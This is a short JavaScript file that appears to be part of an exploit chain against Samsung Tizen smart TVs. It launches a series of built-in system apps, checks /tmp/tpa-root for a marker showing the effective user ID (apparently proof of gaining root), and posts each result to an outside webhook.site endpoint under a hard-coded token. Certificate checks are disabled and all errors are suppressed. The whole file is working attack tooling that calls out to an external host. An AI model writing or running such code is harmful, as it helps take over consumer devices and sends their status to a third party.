var fs = require('fs');
var https = require('https');
var TOKEN = '03471c36-4d0f-4455-ae08-78adca120821';
function send(p, b) {
    try {
        var r = https.request({
            hostname: 'webhook.site',
            path: '/' + TOKEN + '/' + p,
            method: 'POST',
            rejectUnauthorized: false
        }, function () {});
        r.on('error', function () {});
        r.end(b);
    } catch (e) {}
}
var apps = [
    'com.samsung.tv.mycontents',
    'com.samsung.tv.weather-viewer',
    'com.samsung.tv.csa',
    'com.samsung.tv.store',
    'com.samsung.tv.mybixby'
];
function tryNext(i) {
    if (i >= apps.length) {
        send('launch', 'no marker from any app');
        return;
    }
    try {
        tizen.application.launch(apps[i]);
        send('launch', 'launched ' + apps[i]);
    } catch (e) {
        send('launch', 'launch ERR ' + apps[i] + ' ' + e);
    }
    setTimeout(function () {
        try {
            var m = fs.readFileSync('/tmp/tpa-root');
            send('launch', 'euid=' + m.readInt32LE(0) + ' via ' + apps[i]);
        } catch (e) {
            tryNext(i + 1);
        }
    }, 6000);
}
tryNext(0);
